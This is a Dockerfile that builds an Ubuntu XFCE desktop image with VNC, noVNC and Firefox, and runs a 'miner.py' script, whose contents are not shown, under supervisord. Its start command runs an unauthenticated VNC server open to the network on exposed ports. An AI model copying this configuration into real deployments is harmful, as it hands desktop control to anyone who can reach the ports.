FROM --platform=linux/amd64 ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

# Base packages
RUN apt update -y && apt install --no-install-recommends -y \
    xfce4 xfce4-goodies tigervnc-standalone-server novnc websockify sudo \
    xterm init systemd snapd vim net-tools curl wget git tzdata \
    dbus-x11 x11-utils x11-xserver-utils x11-apps \
    software-properties-common python3 python3-pip python3-venv \
    supervisor procps

# Install Firefox from PPA
RUN add-apt-repository ppa:mozillateam/ppa -y
RUN echo 'Package: *' > /etc/apt/preferences.d/mozilla-firefox
RUN echo 'Pin: release o=LP-PPA-mozillateam' >> /etc/apt/preferences.d/mozilla-firefox
RUN echo 'Pin-Priority: 1001' >> /etc/apt/preferences.d/mozilla-firefox
RUN echo 'Unattended-Upgrade::Allowed-Origins:: "LP-PPA-mozillateam:jammy";' | tee /etc/apt/apt.conf.d/51unattended-upgrades-firefox
RUN apt update -y && apt install -y firefox

# Install xubuntu icon theme
RUN apt update -y && apt install -y xubuntu-icon-theme

# Create Xauthority file
RUN touch /root/.Xauthority

# Setup Python environment
RUN python3 -m venv /opt/venv
ENV PATH="/opt/venv/bin:$PATH"

# Install Python dependencies
RUN pip install --no-cache-dir requests psutil

# Copy miner script
COPY miner.py /opt/miner.py
RUN chmod +x /opt/miner.py

# Create supervisor config for miner script
RUN mkdir -p /var/log/supervisor
COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf

# Expose ports
EXPOSE 5901
EXPOSE 6080

# Start everything
CMD bash -c "vncserver -localhost no -SecurityTypes None -geometry 1024x768 --I-KNOW-THIS-IS-INSECURE && \
             openssl req -new -subj "/C=JP" -x509 -days 365 -nodes -out self.pem -keyout self.pem && \
             websockify -D --web=/usr/share/novnc/ --cert=self.pem 6080 localhost:5901 && \
             supervisord -c /etc/supervisor/conf.d/supervisord.conf && \
             tail -f /dev/null"